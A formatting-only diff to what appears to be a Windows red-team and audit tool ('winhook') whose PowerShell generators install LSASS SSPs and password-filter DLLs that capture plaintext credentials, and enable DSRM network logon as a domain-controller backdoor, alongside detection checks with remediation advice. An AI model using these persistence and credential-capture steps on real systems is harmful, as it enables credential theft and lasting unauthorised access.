@@ -22895,7 +22895,8 @@ Write-Output "SUSPICIOUS=$suspicious"
         status: "SUSPICIOUS",
         resource: "lsa://ssp",
         title: `${suspicious[1]} non-standard SSP(s) found — possible credential capture`,
-        details: "Non-standard Security Support Providers in LSASS may be capturing plaintext credentials on every logon.",
+        details:
+          "Non-standard Security Support Providers in LSASS may be capturing plaintext credentials on every logon.",
         remediation: "Review and remove unknown SSPs from HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Security Packages.",
       })
     }
@@ -22944,7 +22945,9 @@ if (-not (Test-Path $destPath)) {
   Write-Output "[*] DLL already exists at: $destPath"
 }
 
-${method === "api" ? `
+${
+  method === "api"
+    ? `
 # Method 1: AddSecurityPackage API (instant, no reboot)
 Write-Output ""
 Write-Output "[*] Loading SSP via AddSecurityPackage..."
@@ -22986,9 +22989,13 @@ try {
   Write-Output "[*] Falling back to registry method..."
   Write-Output "STATUS=FALLBACK"
 }
-` : ""}
+`
+    : ""
+}
 
-${method === "registry" || method !== "api" ? `
+${
+  method === "registry" || method !== "api"
+    ? `
 # Method 2: Registry (persistent, requires reboot or API call to take effect)
 Write-Output ""
 Write-Output "[*] Adding SSP to registry..."
@@ -23005,7 +23012,9 @@ if ($dllName -notin $current) {
   Write-Output "[*] '$dllName' already in Security Packages"
   Write-Output "STATUS=EXISTS"
 }
-` : ""}
+`
+    : ""
+}
 
 Write-Output ""
 Write-Output "[*] After installation, credentials are logged to:"
@@ -23133,7 +23142,8 @@ Write-Output "PPL=$ppl"
         status: "SUSPICIOUS",
         resource: "lsa://notification-packages",
         title: `${suspicious[1]} non-standard password filter(s) found`,
-        details: "Non-standard Notification Packages in LSASS may be capturing plaintext passwords on every password change.",
+        details:
+          "Non-standard Notification Packages in LSASS may be capturing plaintext passwords on every password change.",
         remediation: "Review HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Notification Packages and remove unknown entries.",
       })
     }
@@ -23209,7 +23219,8 @@ if ($dllName -notin $current) {
         status: "INSTALLED",
         resource: `lsa://password-filter/${filterName}`,
         title: `Password filter installed: ${filterName}`,
-        details: "Password filter DLL will load into LSASS on next boot. All password changes will be captured in plaintext.",
+        details:
+          "Password filter DLL will load into LSASS on next boot. All password changes will be captured in plaintext.",
         remediation: `Remove: winhook password_filter --action remove --name ${filterName}`,
       })
     }
@@ -23319,7 +23330,8 @@ if ($admin) {
         status: "EXPLOITABLE",
         resource: "dc://dsrm",
         title: "DSRM network logon enabled (DsrmAdminLogonBehavior=2)",
-        details: "The DSRM administrator can log on via the network at any time. If the DSRM password is known or synced, this provides persistent DC access that survives AD password resets.",
+        details:
+          "The DSRM administrator can log on via the network at any time. If the DSRM password is known or synced, this provides persistent DC access that survives AD password resets.",
         remediation: "Set DsrmAdminLogonBehavior to 0 or remove the registry value.",
       })
     }
@@ -23332,7 +23344,8 @@ if ($admin) {
         status: "INFO",
         resource: "dc://dsrm",
         title: "DC found — DSRM network logon can be enabled for persistence",
-        details: "DsrmAdminLogonBehavior is not set to 2. Use --action enable-network to enable DSRM network logon, then sync the password with a known account.",
+        details:
+          "DsrmAdminLogonBehavior is not set to 2. Use --action enable-network to enable DSRM network logon, then sync the password with a known account.",
         remediation: "Monitor DsrmAdminLogonBehavior registry value for changes.",
       })
     }
@@ -23381,7 +23394,8 @@ Write-Output "STATUS=SUCCESS"
         status: "BACKDOORED",
         resource: "dc://dsrm",
         title: "DSRM network logon enabled — persistent DC backdoor",
-        details: "DsrmAdminLogonBehavior set to 2. DSRM admin can authenticate via network. Sync password with a known account for persistent access.",
+        details:
+          "DsrmAdminLogonBehavior set to 2. DSRM admin can authenticate via network. Sync password with a known account for persistent access.",
         remediation: "Set DsrmAdminLogonBehavior back to 0. Rotate DSRM password.",
       })
     }
@@ -23538,7 +23552,8 @@ Write-Output "Extended Protection: $(if ($epa.SuppressExtendedProtection -eq 1) 
         status: "WEAK",
         resource: "lsa://lm-compatibility",
         title: `NTLMv1/LM responses enabled (level ${lmLevel ? lmLevel[1] : "??"})`,
-        details: "Machine sends NTLMv1 or LM responses. Captured hashes can be cracked in seconds using rainbow tables or DES key recovery.",
+        details:
+          "Machine sends NTLMv1 or LM responses. Captured hashes can be cracked in seconds using rainbow tables or DES key recovery.",
         remediation: "Set LmCompatibilityLevel to 5 (NTLMv2 only, refuse LM & NTLM).",
       })
     }
@@ -23711,7 +23726,8 @@ Write-Output "RDP_ENABLED=$(if ($rdp -eq 0) { '1' } else { '0' })"
         status: "BACKDOORED",
         resource: "accessibility://login-screen",
         title: `${backdoored[1]} accessibility backdoor(s) detected`,
-        details: "Accessibility executables have been replaced or have IFEO debuggers set. SYSTEM shell available at login screen.",
+        details:
+          "Accessibility executables have been replaced or have IFEO debuggers set. SYSTEM shell available at login screen.",
         remediation: "Restore original files from C:\\Windows\\WinSxS or system image. Remove IFEO debugger entries.",
       })
     }
@@ -23905,7 +23921,8 @@ if ($debuggerCount -gt 0 -or $silentCount -gt 0) {
         status: "SUSPICIOUS",
         resource: "registry://ifeo",
         title: `${total} IFEO persistence entries found (${debuggerCount ? debuggerCount[1] : 0} debugger, ${silentCount ? silentCount[1] : 0} silent exit)`,
-        details: "IFEO entries can redirect process execution or trigger payloads on process exit. Review for malicious entries.",
+        details:
+          "IFEO entries can redirect process execution or trigger payloads on process exit. Review for malicious entries.",
         remediation: "Remove suspicious Debugger values and SilentProcessExit monitoring.",
       })
     }
@@ -23990,7 +24007,7 @@ Write-Output "STATUS=SUCCESS"
       output.push(r.stdout)
     }
 
-    if (output.some(o => o.includes("STATUS=SUCCESS"))) {
+    if (output.some((o) => o.includes("STATUS=SUCCESS"))) {
       findings.push({
         checkId: "WIN-IFEO-010",
         provider: "windows",
